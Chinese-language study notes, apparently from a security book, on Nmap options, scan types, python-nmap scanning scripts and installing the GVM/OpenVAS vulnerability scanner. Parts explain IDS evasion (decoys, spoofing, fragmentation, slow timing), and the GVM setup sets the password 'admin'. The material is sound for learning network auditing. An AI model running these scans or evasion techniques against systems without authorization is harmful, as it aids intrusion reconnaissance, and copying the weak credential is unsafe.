3. filtered:    什麼都沒有回應，或是回應極少的訊息，通常是有防火牆運作的情況。有時甚至回應ICMP錯誤type3-code13，也就是這個IP無法到達，誤導掃描者以為這個IP連主機都不存在。但最常見的情況是，該主機什麼都不回應，除非你發送了正確的請求。例如，該主機是個HTTP主機，而你正確的發送了HTTP請求。  

順帶一題，除了NMAP模塊之外os與subprocess也都能呼叫NMAP程式。  

安裝nmap程式:  
```
apt install nmap
```

python nmap模塊的安裝:  
```
pip3 install python-nmap
```

**port本身是由16bit數字來表示的**  
這就意味著，port有0-65535個。  


**擁有主機的IP與特定Port才能與該主機建立溝通，而聯繫雙方都要擁有完整的IP與port。**  


**Network Mapper (Nmap)**  

Nmap是個開源免費的軟體，用來對port進行掃描與檢查。  
可以於以下連結直接下載:  
https://nmap.org/download  

### NMAP使用

直接輸入nmap在終端機會看到指令的使用說明:  
```
Nmap 7.80 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports <port ranges>: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
  --data <hex string>: Append a custom payload to sent packets
  --data-string <string>: Append a custom ASCII string to sent packets
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
```

總體來說NMAP指令格式如下:  
```
nmap 掃描形式  選項  目標
```

**目標指定**
```
目標指定:
  可以傳遞 hostnames, IP ,特定網段 ...等等
  例如: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <要掃描的清單檔案>: 從某個要掃描的網段清單查詢
  -iR <主機數量>: 挑選隨機目標
  --exclude <主機1[,主機2][,主機3],...>: 排除主機或網段
  --excludefile <排除不打算掃描的清單檔案>: 排除不打算掃描的清單檔案
```

**主機發掘**
```
主機發掘:
  -sL: 不會真的掃描，它會列出你輸入的網段，nmap會掃描哪幾個port。再次強調，nmap什都不會做。  
  -sn: Ping掃描，不會每個port掃，主機願意有禮貌的回應ICMP時才能生效。  
  -Pn: 由於一般情況ping不到時，nmap會直接放棄檢查其他的port，但是這個指令會讓nmap不屈不撓的把一定範圍主機裡頭要掃的port掃完。  
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP 的協定發掘，在指定的port下。 
  -PE/PP/PM: ICMP echo(ping), timestamp(時間評估用，但現在很少伺服器願意回應), netmask(網路遮罩確認，用於了解伺服器的子網路結構)
  -PO[協定編號]:  ICMP（協定 1）、IGMP（協定 2）和 IP-in-IP（協定 4）、TCP（協定 6）、UDP（協定 17）和 SCTP（協定 132）
  -n/-R: 別做DNS查詢/總是做DNS查詢 [預設: sometimes]，如果你希望nmap將你輸入的一切都當成IP就輸入-n，而一切當成網址就輸入-R
  --dns-servers <serv1[,serv2],...>: 指定DNS
  --system-dns:僅僅用我們自己保留的DNS紀錄
  --traceroute: 追蹤我們到目標IP中間跳過幾個節點
```

**掃描技術**
```
掃描技術:                                                                                     
  -sS/sT/sA/sW/sM: SYN掃描(又稱為隱藏掃描)/TCP掃描(會建立完整的TCP並且被蒐集到)/ACK掃描(對方如果回應RST代表主機存在)/Window/Maimon掃描                                         
  -sU: UDP 掃描只有在對方使用UDP服務時才有效                                                                                      
  -sN/sF/sX: TCP Null掃描, FIN(FIN在TCP中代表結束訊息), Xmas(尚未確認，但是似乎包含多種掃描方式)
  --scanflags <flags>: 自訂TCP flag      
  -sI <zombie host[:probeport]>: 閒置掃描
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans                                                                
  -sO: 可以掃描到目前使用哪些協定                      
  -b <FTP relay host>: FTP bounce scan  (FTP bounce是一種FTP的漏洞，至於細節請參觀官方文檔)
```


**port指定**
```
Port指定與Port排序:                                                                   
  -p <port 範圍指定>: 指定某個範圍的port進行掃描
    例如: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9                                     
  --exclude-ports <要排除掃描的port範圍>:排除特定範圍的port
  -F: 快速模式，掃描比預設更少的port範圍
  -r: 循序掃描，不會把掃描的port隨機化(更容易被入侵偵測發覺)
  --top-ports <number>: Scan <number> most common ports                                              
  --port-ratio <ratio>: Scan ports more common than <ratio>  
```

**服務與版本掃描**
```
服務與版本:
  -sV: 偵測開啟的port找尋服務與版本
  --version-intensity <level>: 版本偵測的仔細程度 0 (輕量掃描) to 9 (嘗試所有偵測方式)
  --version-light: 偵測最接近的可能 (intensity 2)
  --version-all: 偵測所有的可能 (intensity 9)
  --version-trace: 展示所有版本掃描細節(for debugging)

  範例:sudo nmap -sV --version-all 127.0.0.1

```

**使用寫好的腳本掃描**
```
腳本掃描:
  掃描腳本清單裝在/usr/share/nmap/scripts/script.db裡頭，而腳本都裝在/usr/share/nmap/scripts/裡頭，不會使用某個腳本時，可以打開腳本檔案，裡頭會有些說明，而且讀完整個腳本對於知識很有幫助。

  -sC: 用預設的腳本掃描，等同--script=default。例如: sudo nmap  -sC   127.0.0.1 ，可以得到整理好的掃描內容。你可以看見某些可以訪問的網頁頁面，或是網站標題等等。 
 
  --script=<Lua 腳本>: <Lua 腳本> 用一個逗號來選擇資料夾, 腳本-檔案 或 腳本-分類。例如afp-ls就是afp掃描的ls類別，/usr/share/nmap/scripts/可以找到該檔案afp-ls.nse

  --script-args=<n1=v1,[n2=v2,...]>: 給需要特定參數的腳本提供參數。

  --script-args-file=filename: 給 NSE 腳本(就是腳本)參數，但參數是裝在檔案裡頭。

  --script-trace: 顯示所有腳本發送與接收的資料，例如:sudo nmap   --script-trace -sC   127.0.0.1，我們可以看到腳本發出了什麼內容，又接收了什麼。

  --script-updatedb: 例如，sudo nmap  --script-updatedb可以更新nmap預裝的掃描腳本資料庫

  --script-help=<Lua 腳本>: 顯示關於腳本的說明，雖然沒有直接讀腳本的好，但是可以看到一些參數與使用。 
                            例如: nmap --script-help ssl-enum-ciphers

   範例:nmap --script mycustomscripts,safe 127.0.0.1 ，這個腳本會用mycustomscripts資料夾裡頭的所有腳本與所有safe類型腳本進行掃描

   範例:nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com，運作帶有creds.snmp=admin參數的腳本

   注意:Intrusiveness類別的腳本可能會導致伺服器崩潰，具有一定的攻擊性，請只在自己的主機上使用，nmap --script intrusiveness 127.0.0.1
```

參見:  
https://nmap.org/book/nse-usage.html

**作業系統偵測**
```
作業系統偵測:
  -O: 啟動作業系統偵測
  --osscan-limit: 限制猜測在可能的目標
  --osscan-guess: 更激進的猜測作業系統
```


**時間與效能**
```
時間與效能:
  預設的時間是以秒計算但是可以添加單位 'ms' (milliseconds),'s' (seconds),'m' (minutes), 'h' (hours) 等等。
  -T<0-5>: 設置時間模板(越高越快)，T0,T1會慢慢掃描，但有機會避開IDS。T2會刻意放緩掃描速度。預設掃描速度T3。T4與T5會用掉較大的頻寬，而且掃描不精準，但速度最大化。
  --min-hostgroup/max-hostgroup <size>: 平行化主機掃描，一次最多或最少的同時掃描的主機數量。如果調超大容易被發現，網路負載也大。
  --min-parallelism/max-parallelism <numprobes>: 一次平行化掃port的最大數量。
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: 當掃描一直沒有回應的時候，nmap會重試，多久後重試就是所謂RTT時間。通常RTT時間預設有個特定的演算法來評估該多久之後重試。如果重試時間太短，會造成頻繁失敗，就算伺服器真的會回應，但nmap在伺服器回應之前就放棄，發起下一輪的嘗試。
  --max-retries <tries>: port掃描重傳次數上限，超過就放棄。默認重傳十次。
  --host-timeout <time>: 就算一個主機確實會回應，但是回應卻非常緩慢。這個時候，可以用這個選項來設置，該在一個主機上頭最大花費的掃描時間。
  --script-timeout <time>:一個腳本掃描的時間上限。
  --scan-delay/--max-scan-delay <time>: 每次掃描之間的等待時間。如果減低頻率，可以避開某些IDS規則，例如規則在每0.5秒/次的掃描頻率以上會觸發。
  --min-rate <number>: 最小頻率，調高速度會加快，但太快會帶來各種問題。
  --max-rate <number>: 最大頻率，太慢會帶來各種問題。
```

**防火牆與入侵偵測系統迴避與欺騙**
```
防火牆與入侵偵測系統迴避與欺騙:
  -f; --mtu <val>: 將封包TCP header碎片成較小封包來逃避偵測，預設會20bytes會拆成三個8bytes指定，MTU則是8的倍數。如果失敗可以用--send-eth參數。注意，腳本不支持此操作。
  -D <decoy1,decoy2[,ME],...>: 可以產生封包，使其看起來像網路上好幾個裝置都同時在掃描，以至於IDS很難辨別出哪個裝置正在進行網路掃描。不過最好建立在誘餌主機啟動的前題上，否則會有大量的SYN封包湧入，如果不把自己的IP打進去nmap會隨機挑選一個IP。
  -S <IP_Address>: 來源IP欺騙，但是你沒辦法收到回傳封包。
  -e <iface>: 使用特定的網路界面
  -g/--source-port <portnum>: 從某個假的port號傳送封包，可以將port號打在後面。
  --proxies <url1,[url2],...>: 透過proxy掃描。
  --data <hex string>: 將特定的內容放入數據包。用16進位表示法。
  --data-string <string>: 加入ASCII文字內容。
  --data-length <num>: 將特定長度的隨機數據放入封包中。
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: 在IPv4中的移動生存時間。
  --spoof-mac <mac address/prefix/vendor name>: 偽造MAC位址，輸入0 隨機產生MAC，但會影響某些掃描的能力。
  --badsum: 產生錯誤的校驗和，讓主機直接丟棄封包，入侵偵測系統也不會認真紀錄這些封包。
```

**輸出內容**
```
OUTPUT:
  -oN/-oX/-oS <file>: 輸出模式oN普通模式, oX是XML模式, oS是中二至極的輸出模式英文部份會被取代成符號跟數字。後面接著輸出檔案名稱。
  -oA <basename>: 以三種主要輸出格式輸出。
  -v: 提高輸出的仔細程度 (-vv或更多v可以達到更好的效果)
  -d: 提高便於debug的更多細節 (-dd 或更多v可以達到更好的效果)
  --reason: 說明一個port為什麼是open,close,filted模式
  --open: 只顯示開啟的port。
  --packet-trace: 顯示每個封包的傳輸與接收。
  --iflist: 顯示主機的界面與路由器界面。
  --append-output: 接在原本已經有的輸出上。
  --resume <filename>: 復原已經失效的掃描。
  --stylesheet <path/URL>: 以XSL風格將 XML 轉成 HTML格式。
  --webxml: 從Nmap.Org 參考更多可攜式 XML風格。
  --no-stylesheet: 防止使用 XSL 風格 在XML輸出上。
```

**其他項目**
```
其他項目:
  -6: 啟動 IPv6 掃描
  -A: 啟動作業系統偵測 OS , 伺服器應用程式與資料庫版本偵測,預設腳本掃描,路由追蹤模式。
  --datadir <dirname>: 指定自訂 Nmap data 資料夾位置
  --send-eth/--send-ip: 送出原始ethernet frames 或 IP 封包
  --privileged: 假定使用者擁有完整權限
  --unprivileged: 假定使用者缺乏使用socket的權限。
  -V: 顯示nmap版本。
  -h: 印出幫助頁面。
```

(p.265)  
我們來瞧瞧幾個常見的掃描:

1.  TCP掃描  
    ```
    nmap -sT
    ```
    這種掃描方式可以清楚port是否開放，但是也是最常被入侵偵測系統(Intrusion Detection Systems) (IDSes)發現的機制。主要是建立在，當我們送出SYN封包時，伺服器就會回應ACK封包，這樣我們就知道這個TCP port是有響應的。當收到RST flag時，就代表該port是關閉的，但主機是打開而且存在網路上的。  

2.  TCP隱藏掃描  
    ```
    nmap -sS
    ```
    此種掃描方式是用不完成三方交握的方法進行掃描，三方交握未完成的情況下，某些系統不一定會留下紀錄。也就是主機不一定會發現自己正在被掃描。  

    **情況:主機的某個Port是啟動的**
    >1.我方傳給目標主機SYN封包   

    >2.目標主機回應SYN/ACK封包  

    >3.我方不會將最後的ACK封包送出，也就是三方交握不會完成，某些系統不會將其進行紀錄。我方會回傳RST給目標主機，類似告訴目標主機"對不起，剛剛傳錯了，請忘了這件事情"  

    **情況:主機的某個Port是關閉的**
    >1.我方傳給目標主機SYN封包  

    >2.目標主機回應RST封包，代表目標主機現在沒打算使用這個Port進行連線  

    **情況:主機的某個Port是被防火牆屏蔽的或者是目標主機沒有回應**
    >1.我方傳給目標主機SYN封包  

    >2.什麼都沒收到，遲遲沒有回應，這個時候namap超過一定時間後會自動放棄  

3. 快速掃描
    ```
    nmap -sn
    ```
    快速掃描只會傳送ICMP封包，不會其他幾個常用的port進行掃描，所以速度很快。可以用在，要掃描的範圍很廣，但是你無法確切清楚目標主機的IP位址。  

4. UDP掃描
    ```
    nmap -sU
    ```
    傳送一個UDP封包給目標主機，如果得到一個UDP封包做回應，代表主機的此port是開放的，如果只得到Internet Control Message Protocol (ICMP) 第三類回應destination unreachable，就代表port是關閉的。  

5. TCP ACK掃描
    ```
    nmap -sA
    ```
    正常要三方交握需要先傳遞SYN封包，但是這種掃描會先傳遞ACK，目標主機會認為這是一個錯誤的訊息傳遞，所以回應RST。雖然我們不能得知主機的某port是否開啟與確切狀態，但是我們可以知道這裡有個主機。  

<span id="python-nmap"></span>

# 用python啟動NMAP

安裝python nmap模塊

```bash
pip3 install python-nmap
```

<span style="color:red;">別安裝成nmap唷～是python-nmap</span>

簡單的調用nmap掃描模式

```python
>>> import nmap
>>> portScanner = nmap.PortScanner()
>>> results = portScanner.scan('scanme.nmap.org', '80-85','-sV')
>>> results
```

我們可以用以下指令看到使用說明

```python
>>> help(nmap.PortScanner.scan)
Help on function scan in module nmap.nmap:

scan(self, hosts='127.0.0.1', ports=None, arguments='-sV', sudo=False, timeout=0)
    Scan given hosts
```

順代一題，我們可以用command_line()檢查實際上觸發了什麼nmap指令，與scaninfo()檢查細節內容:

```python
>>> import nmap
>>> portScanner = nmap.PortScanner()
>>> results = portScanner.scan('scanme.nmap.org', '80-85','-sV')
>>> results
>>> portScanner.command_line()
>>> portScanner.scaninfo()
```

**簡單主機port掃描:**
```python
import nmap
                    
portScanner = nmap.PortScanner()

host_scan = input('Host scan: ')

portlist="21,22,23,25,80"	
portScanner.scan(hosts=host_scan, arguments='-n -p'+portlist)

print(portScanner.command_line())

hosts_list = [(x, portScanner[x]['status']['state']) for x in portScanner.all_hosts()]
for host, status in hosts_list:
    print(host, status)

for protocol in portScanner[host].all_protocols():
    print('Protocol : %s' % protocol)
    listport = portScanner[host]['tcp'].keys()
    for port in listport:
        print('Port : %s State : %s' % (port,portScanner[host][protocol][port]['state']))

```

**非異步掃描**

掃描完一個port之後再掃描下一個。

```python
import optparse
import nmap

class NmapScanner:
     
    def __init__(self): 
        self.portScanner = nmap.PortScanner()
    
    def nmapScan(self, ip_address, port): 
        self.portScanner.scan(ip_address, port) 
        self.state = self.portScanner[ip_address]['tcp'][int(port)]['state']
        print(" [+] Executing command: ", self.portScanner.command_line()) 
        print(" [+] "+ ip_address + " tcp/" + port + " " + self.state)

def main():
    parser = optparse.OptionParser("usage%prog " + "--ip_address <target ip address> --ports <target port>") 
    parser.add_option('--ip_address', dest = 'ip_address', type = 'string', help = 'Please, specify the target ip address.')
    parser.add_option('--ports', dest = 'ports', type = 'string', help = 'Please, specify the target port(s) separated by comma.')
    (options, args) = parser.parse_args()
    if (options.ip_address == None) | (options.ports == None): 
        print('[-] You must specify a target ip_address and a target port(s).')
        exit(0)
    ip_address = options.ip_address
    ports = options.ports.split(',')

    for port in ports: 
        NmapScanner().nmapScan(ip_address, port)

if __name__ == "__main__": 
    main()
```


操作方式:
```
python3 NmapScanner.py --ip_address 127.0.0.1 --ports 80
```


**非異步掃描輸出CSV檔**
```python
#!/usr/bin/env python3

import optparse
import nmap
import csv

class NmapScannerCSV:
     
    def __init__(self):
        self.portScanner = nmap.PortScanner()
    
    def nmapScanCSV(self, host, ports):
        try:
            print("Checking ports "+ str(ports) +" ..........")
            self.portScanner.scan(host, arguments='-n -p'+ports)
            
            print("[*] Executing command: %s" % self.portScanner.command_line())
            
            print(self.portScanner.csv())

            print("Summary for host",host)

            with open('csv_file.csv', mode='w') as csv_file:
                csv_writer = csv.writer(csv_file, delimiter=',')
                csv_writer.writerow(['Host', 'Protocol', 'Port', 'State'])
           
                for x in self.portScanner.csv().split("\n")[1:-1]:
                    splited_line = x.split(";")
                    host = splited_line[0]
                    protocol = splited_line[5]
                    port = splited_line[4]
                    state = splited_line[6]
                    print("Protocol:",protocol,"Port:",port,"State:",state)
                    csv_writer.writerow([host, protocol, port, state])         
    
        except Exception as exception:
            print("Error to connect with " + host + " for port scanning" ,exception)
    
def main():
    parser = optparse.OptionParser("usage%prog " + "--host <target host> --ports <target port>") 
    parser.add_option('--host', dest = 'host', type = 'string', help = 'Please, specify the target host.')
    parser.add_option('--ports', dest = 'ports', type = 'string', help = 'Please, specify the target port(s) separated by comma.')
    (options, args) = parser.parse_args()
    if (options.host == None) | (options.ports == None): 
        print('[-] You must specify a target host and a target port(s).')
        exit(0)
    host = options.host
    ports = options.ports

    NmapScannerCSV().nmapScanCSV(host,ports)

if __name__ == "__main__": 
    main()
```

操作方式
```
python3 NmapScannerCSV.py --host 127.0.0.1 --ports 21,22,23,25,80
```

**非異步掃描檢查OS**

```python
import nmap, sys

command="OS_detection.py  <hostname/IP address>"

if len(sys.argv) == 1:
    print(command)
    sys.exit()

host = sys.argv[1]

portScanner = nmap.PortScanner()
open_ports_dict =  portScanner.scan(host, arguments="-O -v")
print(open_ports_dict)

```
操作方式
```
 sudo python3 nmap_operating_system.py 127.0.0.1
```

**異步port掃描**

可以同時掃描多個port甚至多個目標。

```python
import nmap

portScannerAsync = nmap.PortScannerAsync()

def callback_result(host, scan_result):
    print(host, scan_result)

portScannerAsync.scan(hosts='scanme.nmap.org', arguments='-p 21', callback=callback_result)
portScannerAsync.scan(hosts='scanme.nmap.org', arguments='-p 22', callback=callback_result)
portScannerAsync.scan(hosts='scanme.nmap.org', arguments='-p 23', callback=callback_result)
portScannerAsync.scan(hosts='scanme.nmap.org', arguments='-p 80', callback=callback_result)

while portScannerAsync.still_scanning():
    print("Scanning >>>")
    portScannerAsync.wait(5)

```

測試方式

```
python3 PortScannerAsync.py
```

**異步掃描**

一旦操作正確，所有掃描請求會短時間內併發。

```python
import nmap
import argparse

def callbackResult(host, scan_result):
    #print(host, scan_result)
    port_state = scan_result['scan'][host]['tcp']
    print("Command line:"+ scan_result['nmap']['command_line'])
    for key, value in port_state.items():
        print('Port {0} --> {1}'.format(key, value))

class NmapScannerAsync:
    def __init__(self):
        self.portScannerAsync = nmap.PortScannerAsync()
    
    def scanning(self):
        while self.portScannerAsync.still_scanning():
            print("Scanning >>>")
            self.portScannerAsync.wait(5)

    def nmapScanAsync(self, hostname, port):
        try:
            print("Checking port "+ port +" ..........")
            self.portScannerAsync.scan(hostname, arguments="-A -sV -p"+port ,callback=callbackResult)
            self.scanning()
        except Exception as exception:
            print("Error to connect with " + hostname + " for port scanning",str(exception))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Asynchronous Nmap scanner')
    parser.add_argument("--host", dest="host", help="target IP / domain", required=True)
    parser.add_argument("-ports", dest="ports", help="Please, specify the target port(s) separated by comma[80,8080 by default]", default="80,8080")
    parsed_args = parser.parse_args()
    port_list = parsed_args.ports.split(',')
    host = parsed_args.host
    for port in port_list:
        NmapScannerAsync().nmapScanAsync(host, port)

```

```
python3 NmapScannerAsync.py  --host 127.0.0.1 -ports 21-25
```
不知道為什麼 -ports 21-25可以併發，但是寫成 21,22,23,24,25不能併發。


**單純用OS呼叫nmap**
簡短方便，如果沒有額外特殊要求的話
```python
import os

nmap_command="nmap -sT 127.0.0.1"

os.system(nmap_command)

```

**用Subporcess呼叫nmap**

跟上面的效果幾乎一樣，建立個額外的peocess來啟動nmap。

```python
from subprocess import Popen, PIPE

process = Popen(['nmap','-O','127.0.0.1'], stdout=PIPE, stderr=PIPE)
stdout, stderr = process.communicate()
print(stdout.decode())

```
(p.284)


<span id="python-script"></span>

# 用NMAP腳本進行弱點掃描


<span id="GVM"></span>
# GVM掃描弱點

## 用途

OpenVAS是個開放原始碼的弱點掃描工具。  
裡頭紀錄著CVE與OWASP列出的各種弱點，可以簡單的在Debian,Ubuntu,Mint上頭安裝。

## 安裝方式

由於OpenVAS目前該公司嘗試轉型中，所以被整合在新的產品GVM裡頭了，同樣也是免費的。  
考慮到需要大量的依賴函數庫，這裡就用docker安裝，不然會產生大量困擾。  

安裝方法參考該網誌:  
https://www.freebuf.com/articles/container/236909.html  

先搜索docker的映像庫  

```
docker search gvm
```

找到securecompliance公司出品的gvm下載

```
docker pull securecompliance/gvm 
```

背景運作容器，將本機的8080 port映射到容器的9392 port，容器名稱gvm
```
docker run --detach --publish 8080:9392 --publish 5432:5432 --publish 2222:22    --name gvm securecompliance/gvm
```
接著等上老半天。  
它需要安裝一些套件，並且更新許多東西，沒辦法馬上好。  

我們可以用以下指令偷偷瞧瞧，工作做到哪裡了。  
```
docker logs -f gvm
```
等到跑出
```
++++++++++++++++++++++++++++++++++++++++++++
+your GVM 11 container is now ready to use!+
++++++++++++++++++++++++++++++++++++++++++++
```
一類的字樣，就代表好了。  

因為要非常長的時間，強烈建議讓它跑。

<span style="color:red;">如果安裝失敗，可以考慮OWASP ZAP</span>

GVM docker 官方說明  
https://securecompliance.gitbook.io/projects/openvas-greenbone-deployment-full-guide

要連接上的話，請記得用https而非http，http會沒反應。

而且，不是容器IP，是宿主機IP。

例如你的宿主電腦區域網路IP是192.168.199.108:8080  
請用下列網址登入

```
https://192.168.199.108:8080/
```

如果你順利進入登入畫面，那恭喜你。  

雖然官方文檔說，預設帳號密碼都是admin，但是我實測，不知道為什麼就會失敗。  

建議你登入容器

```
docker exec -it gvm bash
```

然後手動用以下指令更改帳號密碼，下列範例帳號密碼都是admin:

```
su -c "gvmd --user=admin --new-password=admin" gvm
```

然後點到scan的欄位，左上角一個星星符號，那裡可以建立新的掃描任務，還有主機建議先嘗試打IP，如果打網址(偶發)會無法存入資料庫。可能是設計錯誤，上游公司有特別說明，這個GVM還在開發中。








